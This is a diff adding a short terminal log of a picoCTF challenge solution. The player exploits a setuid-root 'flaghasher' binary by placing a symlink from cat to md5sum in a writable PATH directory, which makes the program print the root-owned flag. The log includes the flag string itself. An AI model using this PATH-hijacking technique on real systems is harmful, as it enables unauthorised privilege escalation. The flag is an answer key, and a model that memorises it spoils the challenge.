@@ -1,0 +1,18 @@
+ctf-player@pico-chall$ which flaghasher
+/usr/local/bin/flaghasher
+ctf-player@pico-chall$ ls -l /usr/local/bin | grep flaghasher
+-rwsr-xr-x 1 root root 18312 Aug 21 19:28 flaghasher
+ctf-player@pico-chall$ flaghasher
+Computing the MD5 hash of /root/flag.txt....
+
+f4e3bfed79132931cc17886078a4331e  /root/flag.txt
+
+ctf-player@pico-chall$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+ctf-player@pico-chall$ ln -s /usr/bin/cat /usr/local/sbin/md5sum
+ln: failed to create symbolic link '/usr/local/sbin/md5sum': Permission denied
+ctf-player@pico-chall$ ln -s /usr/bin/cat /usr/local/bin/md5sum
+ctf-player@pico-chall$ flaghasher
+Computing the MD5 hash of /root/flag.txt....
+
+picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_75ba71f4}
